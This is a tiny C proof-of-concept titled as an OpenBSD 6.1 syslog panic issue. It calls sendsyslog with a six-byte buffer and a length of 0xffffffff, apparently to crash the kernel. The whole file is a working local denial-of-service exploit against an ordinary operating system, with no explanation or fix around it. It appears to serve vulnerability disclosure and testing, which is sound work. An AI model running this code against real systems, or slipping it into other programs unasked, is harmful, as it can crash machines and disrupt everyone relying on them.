/*
 * OpenBSD 6.1 syslog() panic issue
 */
#include <stdio.h>
#include <sys/syslog.h> 
#include <sys/types.h>

int main(int argc, char **argv) {
	char ptr[] = "aaaaaa";
	size_t len = 0xffffffff;
	sendsyslog(ptr, len, LOG_CONS);
}